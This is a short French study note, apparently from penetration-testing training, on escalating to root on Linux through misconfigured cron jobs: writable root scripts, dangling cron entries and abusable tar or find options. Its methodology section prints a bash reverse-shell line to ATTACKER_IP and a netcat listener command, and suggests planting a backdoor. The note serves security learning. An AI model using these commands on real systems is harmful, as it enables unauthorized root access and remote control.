ğŸ“ Note sur lâ€™Ã©lÃ©vation de privilÃ¨ges Linux : Cron Jobs
ğŸ”¹ 1. Rappel sur cron

Cron jobs = tÃ¢ches planifiÃ©es qui sâ€™exÃ©cutent automatiquement Ã  intervalles dÃ©finis.

Chaque utilisateur peut avoir sa crontab (crontab -l).

Les cron jobs systÃ¨me sont stockÃ©s dans :

/etc/crontab

/etc/cron.d/

/var/spool/cron/ (par utilisateur)

ğŸ‘‰ Ces tÃ¢ches tournent avec les privilÃ¨ges de leur propriÃ©taire (donc souvent root pour les cron systÃ¨mes).

ğŸ”¹ 2. Escalade de privilÃ¨ges via cron
Cas 1 : Script modifiable par lâ€™utilisateur

Si un script exÃ©cutÃ© par cron appartient Ã  root mais est Ã©crivable par un utilisateur, alors on peut modifier son contenu.

Exemple :

* * * * * root /home/user/backup.sh


Si backup.sh est modifiable : remplacer le contenu par une reverse shell.

Cas 2 : Script manquant (dangling cron job)

Les admins suppriment le script mais oublient de supprimer la ligne cron.

Si le PATH dÃ©fini dans /etc/crontab inclut /home/user, il suffit de crÃ©er un script du mÃªme nom (ex: antivirus.sh) et il sera exÃ©cutÃ© par root.

Cas 3 : Exploitation indirecte

MÃªme si on ne peut pas modifier directement le script, il peut utiliser un outil exploitable (ex: tar, rsync, find) â†’ exploiter leurs options dangereuses (--checkpoint-action, wildcards, etc.).

ğŸ”¹ 3. MÃ©thodologie dâ€™exploitation

Lister les cron jobs :

cat /etc/crontab
ls -la /etc/cron.*
crontab -l


VÃ©rifier permissions des scripts appelÃ©s (est-ce que tu peux les modifier ?).

VÃ©rifier si un script manque â†’ recrÃ©er avec une backdoor.

Si modifiable â†’ insÃ©rer une reverse shell (en utilisant bash, python, perl, ou nc selon disponibilitÃ©).
Exemple (bash) :

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1


Lancer un listener cÃ´tÃ© attaquant :

nc -lvnp 4444

ğŸ”¹ 4. Points Ã  retenir

Les cron jobs mal configurÃ©s sont frÃ©quents dans des environnements avec faible maturitÃ© sÃ©curitÃ©.

Toujours :

VÃ©rifier les permissions dâ€™Ã©criture.

VÃ©rifier les scripts supprimÃ©s mais toujours rÃ©fÃ©rencÃ©s.

VÃ©rifier les outils utilisÃ©s dans les scripts (tar, find, rsync, etc.).

ğŸ‘‰ Un cron mal configurÃ© = escalade facile vers root.